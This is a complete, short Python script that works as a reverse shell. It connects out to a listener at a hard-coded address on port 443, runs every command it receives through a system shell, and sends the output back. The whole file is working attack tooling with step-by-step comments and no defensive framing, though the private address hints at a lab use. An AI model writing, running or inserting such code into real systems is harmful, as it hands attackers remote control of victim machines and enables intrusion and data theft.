#!/usr/bin/python

import socket
import subprocess

HOST = '192.168.1.1' # The ip of the listener.
PORT = 443 # The same port as listener.

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT)) # Connect to listener.
s.send('[*] Connection Established!') # Send connection confirmation.

while 1: # Start loop.
    data = s.recv(1024) # Recieve shell command.
    # Run shell command.
    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
    stdout_value = proc.stdout.read() + proc.stderr.read() # Read output.
    s.send(stdout_value) # Send output to listener.
    if data == "quit": 
        break # If its quit, then break out and close socket.
s.close() # Close socket.
